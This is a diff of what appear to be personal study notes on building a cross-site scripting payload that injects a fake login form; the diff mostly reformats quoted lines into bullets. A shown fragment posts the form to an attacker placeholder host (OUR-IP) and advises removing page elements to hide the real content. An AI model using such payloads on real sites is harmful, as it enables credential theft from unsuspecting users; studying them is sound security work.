@@ -4,9 +4,8 @@
 
 ##### 1. Constructing the Payload
 
-> This is a type of [[Cross Site Scripting (XSS)]] attack.
-
-This form would be injected into the discover XSS injection point.
+This is a type of [[Cross Site Scripting (XSS)]] attack.
+- This form would be injected into the discover XSS injection point.
 
 ```HTML
 <form action=http://OUR-IP>
@@ -29,8 +28,8 @@ document.write(
 );
 ```
 
-> This will add our login form to the page, but it will not remove other parts of the page that we might want to not appear. 
-> To do that, use the `document.getElementById().remove()` function.
+This will add our login form to the page, but it will not remove other parts of the page that we might want to not appear. 
+- To do that, use the `document.getElementById().remove()` function.
 
 Therefore, the final payload: 
 
